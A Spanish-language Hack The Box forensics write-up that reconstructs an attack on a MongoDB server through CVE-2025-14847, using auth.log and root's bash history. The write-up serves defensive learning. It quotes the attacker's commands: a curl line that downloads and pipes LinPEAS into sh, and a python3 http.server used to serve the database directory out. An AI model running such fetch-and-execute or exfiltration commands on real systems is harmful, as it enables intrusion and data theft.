---
sherlock: MangoBleed
domain: DFIR / Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [dfir, linux, mongodb, uac, cve-2025-14847, exfiltracion]
---

# MangoBleed — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de investigación; sin respuestas literales de la plataforma.

## Escenario

El host `mongodbsync` es un **MongoDB secundario** que se mantiene una vez al mes. El administrador acaba de oír hablar de *MongoBleed* y entrega una **adquisición de triaje hecha con UAC** (`uac-mongodbsync-linux-triage.tar.gz`) para confirmar si hubo compromiso y reconstruir la actividad.

## Evidencias

```text
uac-mongodbsync-linux-triage/
├── bodyfile
├── hash_executables
├── [root]/var/log/mongod.log        (JSON estructurado)
├── [root]/var/log/auth.log
├── [root]/root/.bash_history
└── [live]/...
```

## Investigación

### 1. La vulnerabilidad del enunciado

MongoBleed es **CVE-2025-14847**: una fuga de memoria del servidor MongoDB en el manejo de la compresión zlib de mensajes de red. No requiere autenticación y expone fragmentos de memoria (incluidas credenciales) a quien pueda hablar con el puerto. La versión afectada del caso es **8.0.16**, que se confirma en el `buildInfo`/arranque de `mongod.log`.

```bash
grep -o '"msg":"[^"]*"' mongod.log | sort | uniq -c | sort -rn | head
grep -i buildInfo mongod.log | head
```

### 2. Acceso inicial

`auth.log` conserva las sesiones `sshd` del usuario `mongoadmin`: dos aperturas seguidas desde la misma IP externa, la segunda justo antes de la actividad manual. Esa IP es el origen del atacante y la cuenta comprometida, la de administración.

```bash
grep Accepted auth.log
last -f wtmp | head
```

### 3. Manos en el teclado

El `.bash_history` de `root` es la pieza central: descarga de **LinPEAS** desde el release de PEASS-ng, ejecución, y después un `cd` a un directorio concreto seguido de un servidor web de Python para sacar datos.

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python3 -m http.server
```

El directorio objetivo es **`/var/lib/mongodb`**: el atacante empaqueta la base de datos y la sirve por HTTP en lugar de usar el propio protocolo de Mongo.

## Conclusiones

- Acceso: explotación no autenticada de **CVE-2025-14847** contra el MongoDB expuesto.
- Escalada: la cuenta `mongoadmin` ya tenía privilegios suficientes; LinPEAS sólo confirma el terreno.
- Exfiltración: copia de `/var/lib/mongodb` servida con `python3 -m http.server`.

## Lecciones

- Un CVE de fuga de memoria se detecta por la versión y por conexiones anómalas al puerto, no por firmas de malware.
- En triajes UAC, `auth.log` + `.bash_history` reconstruyen casi toda la cadena.
- El histórico de comandos mezcla herramientas legítimas (LinPEAS) con la exfiltración: hay que leerlo entero.
- Mitigación: actualizar MongoDB, cerrar el puerto a Internet y alertar de `python -m http.server` en servidores.
